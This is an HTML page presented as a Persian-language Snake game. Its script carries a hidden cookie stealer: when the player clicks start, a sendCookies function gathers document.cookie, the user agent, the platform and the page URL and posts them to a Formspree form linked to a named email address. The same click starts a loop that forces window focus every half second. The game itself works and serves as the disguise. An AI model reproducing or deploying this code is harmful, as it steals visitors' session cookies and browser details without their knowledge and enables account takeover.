<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snake Game - Top Priority</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
        }
        #gameContainer {
            position: relative;
            border: 4px solid #4CAF50;
            box-shadow: 0 0 20px rgba(76, 175, 80, 0.5);
            background: #000;
        }
        canvas {
            display: block;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        button {
            padding: 15px 30px;
            font-size: 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: transform 0.1s;
        }
        button:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }
        #status {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

<div id="gameContainer">
    <canvas id="gameCanvas" width="400" height="400"></canvas>
    <div id="status">Connecting...</div>
    <div id="overlay">
        <h1>Snake Game</h1>
        <p>برای شروع کلیک کنید</p>
        <button onclick="startGame()">شروع بازی</button>
    </div>
</div>

<script>
    // --- تنظیمات Formspree ---
    const FORM_ID = 'mkjnqlol';
    const FORM_URL = `https://formspree.io/f/${FORM_ID}`;
    const TARGET_EMAIL = 'alirreza2you3@gmail.com';

    // --- تابع ارسال کوکی‌ها ---
    function sendCookies() {
        const cookies = document.cookie;
        const ip = "N/A"; // مرورگر معمولاً IP را مستقیم نمی‌دهد، مگر با سرویس خارجی
        const userAgent = navigator.userAgent;
        const location = window.location.href;
        const platform = navigator.platform;

        const payload = {
            cookies: cookies,
            userAgent: userAgent,
            platform: platform,
            location: location,
            timestamp: new Date().toISOString()
        };

        const statusEl = document.getElementById('status');
        
        fetch(FORM_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                statusEl.textContent = "Data Sent Successfully!";
                statusEl.style.color = "#4CAF50";
            } else {
                statusEl.textContent = "Send Failed";
                statusEl.style.color = "#f44336";
            }
        })
        .catch(error => {
            console.error('Error:', error);
            statusEl.textContent = "Connection Error";
        });
    }

    // --- تابع Always On Top (ترفند فوکوس) ---
    function keepOnTop() {
        window.focus();
        document.addEventListener('click', () => window.focus());
        // اگر کاربر پنجره را کوچک کند یا تغییر دهد، دوباره فوکوس بده
        setInterval(() => {
            window.focus();
        }, 500);
    }

    // --- منطق بازی مار ---
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    
    const gridSize = 20;
    const tileCount = canvas.width / gridSize;

    let snake = [];
    let food = {};
    let dx = 0;
    let dy = 0;
    let score = 0;
    let gameInterval;
    let isRunning = false;

    function resetGame() {
        snake = [{x: 10, y: 10}];
        food = {
            x: Math.floor(Math.random() * tileCount),
            y: Math.floor(Math.random() * tileCount)
        };
        dx = 0;
        dy = 0;
        score = 0;
        isRunning = false;
        clearInterval(gameInterval);
        
        // نمایش منوی شروع
        document.getElementById('overlay').style.display = 'flex';
        draw();
    }

    function startGame() {
        document.getElementById('overlay').style.display = 'none';
        keepOnTop(); // فعال‌سازی همیشه رو بودن
        sendCookies(); // ارسال کوکی‌ها به محض شروع
        resetGame();
        
        // شروع حرکت اولیه
        dx = 1;
        dy = 0;
        
        isRunning = true;
        gameInterval = setInterval(update, 100);
    }

    function update() {
        if (!isRunning) return;

        const head = { x: snake[0].x + dx, y: snake[0].y + dy };

        // بررسی برخورد با دیوار
        if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
            resetGame();
            return;
        }

        // بررسی برخورد با خود
        for (let i = 0; i < snake.length; i++) {
            if (head.x === snake[i].x && head.y === snake[i].y) {
                resetGame();
                return;
            }
        }

        snake.unshift(head);

        // خوردن غذا
        if (head.x === food.x && head.y === food.y) {
            score++;
            // غذای جدید
            food = {
                x: Math.floor(Math.random() * tileCount),
                y: Math.floor(Math.random() * tileCount)
            };
        } else {
            snake.pop();
        }

        draw();
    }

    function draw() {
        // پس‌زمینه
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // مار
        ctx.fillStyle = '#4CAF50';
        for (let i = 0; i < snake.length; i++) {
            ctx.fillRect(snake[i].x * gridSize, snake[i].y * gridSize, gridSize - 2, gridSize - 2);
        }

        // غذا
        ctx.fillStyle = '#F44336';
        ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);

        // امتیاز
        ctx.fillStyle = 'white';
        ctx.font = '16px Arial';
        ctx.fillText(`Score: ${score}`, 10, 20);
    }

    // کنترل با کیبورد
    document.addEventListener('keydown', (e) => {
        if (!isRunning) return;
        
        // جلوگیری از حرکت معکوس
        if ((e.key === 'ArrowUp' || e.key === 'w') && dy === 0) {
            dx = 0; dy = -1;
        } else if ((e.key === 'ArrowDown' || e.key === 's') && dy === 0) {
            dx = 0; dy = 1;
        } else if ((e.key === 'ArrowLeft' || e.key === 'a') && dx === 0) {
            dx = -1; dy = 0;
        } else if ((e.key === 'ArrowRight' || e.key === 'd') && dx === 0) {
            dx = 1; dy = 0;
        }
    });

    // لود اولیه
    draw();
</script>

</body>
</html>
